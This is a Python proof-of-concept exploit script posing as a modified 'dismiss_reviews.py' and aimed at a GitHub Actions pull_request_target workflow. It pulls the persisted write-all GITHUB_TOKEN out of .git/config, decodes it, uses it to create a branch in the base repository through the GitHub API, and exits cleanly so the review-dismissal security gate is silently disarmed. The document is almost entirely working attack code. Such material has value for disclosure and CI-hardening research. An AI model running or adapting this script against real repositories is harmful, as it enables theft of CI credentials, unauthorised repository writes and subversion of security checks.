#!/usr/bin/env python3
# ATTACKER-MODIFIED VERSION OF scripts/gha/dismiss_reviews.py (PoC payload).
# Upstream file is executed by .github/workflows/checks_secure.yml (pull_request_target)
# from the checkout of refs/pull/N/merge -- i.e. from THIS PR's tree -- with
# permissions: write-all and actions/checkout persist-credentials: true.
#
# Payload:
#   1. read the persisted write-all GITHUB_TOKEN from .git/config
#   2. use it to create a new branch in the BASE repo (den3110/firebase-cpp-sdk-poc)
#      -> proves attacker code achieved write access to the repository
#   3. exit 0 -> the "Dismiss reviews" gate silently does nothing (attacker
#      controls the outcome of the security check itself)
import base64
import json
import os
import re
import time
import urllib.request

MARK = "[PoC] firebase-cpp-sdk checks_secure.yml pull_request_target PWN"

# --- 1. persisted credential from actions/checkout persist-credentials:true ---
cfg = open(os.path.join(os.environ.get("GITHUB_WORKSPACE", "."), ".git", "config")).read()
m = re.search(r"extraheader\s*=\s*AUTHORIZATION:\s*basic ([A-Za-z0-9+/=]+)", cfg, re.I)
print(MARK)
if not m:
    print("[PoC] no persisted credential found in .git/config"); raise SystemExit(0)
basic = m.group(1)
decoded = base64.b64decode(basic).decode()
print(f"[PoC] persisted credential FOUND (len={len(basic)}), decoded prefix: {decoded[:22]}...")
token = decoded.split(":", 1)[1]

# --- 2. prove write access: create a branch in the BASE repo ---
req = urllib.request.Request(
    "https://api.github.com/repos/den3110/firebase-cpp-sdk-poc/git/refs/heads/main",
    headers={"Authorization": f"token {token}", "Accept": "application/vnd.github+json"})
main = json.load(urllib.request.urlopen(req))
body = json.dumps({"ref": f"refs/heads/poc/pwned-{int(time.time())}", "sha": main["object"]["sha"]}).encode()
req = urllib.request.Request(
    "https://api.github.com/repos/den3110/firebase-cpp-sdk-poc/git/refs",
    data=body, method="POST",
    headers={"Authorization": f"token {token}", "Accept": "application/vnd.github+json",
             "Content-Type": "application/json"})
resp = json.load(urllib.request.urlopen(req))
print(f"[PoC] WRITE-ALL CONFIRMED: created branch {resp['ref']} in base repo")

# --- 3. disarm the gate: never dismiss anything ---
print("[PoC] gate disarmed: original dismiss_reviews.py logic NOT executed (attacker chose exit 0)")
raise SystemExit(0)
